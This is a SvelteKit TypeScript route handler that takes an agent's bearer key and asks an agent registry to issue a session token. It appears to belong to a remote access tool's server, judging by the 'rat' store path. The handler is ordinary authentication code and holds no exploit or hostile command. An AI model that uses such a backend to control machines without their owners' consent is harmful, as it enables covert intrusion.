import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';

function extractBearerToken(headerValue: string | null): string | null {
	if (!headerValue) {
		return null;
	}
	const match = /^Bearer\s+(?<token>.+)$/i.exec(headerValue.trim());
	return match?.groups?.token?.trim() ?? null;
}

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const key = extractBearerToken(request.headers.get('authorization'));
	if (!key) {
		throw error(401, 'Missing agent key');
	}

	try {
		const response = registry.issueSessionToken(id, key);
		return json(response);
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to issue session token');
	}
};
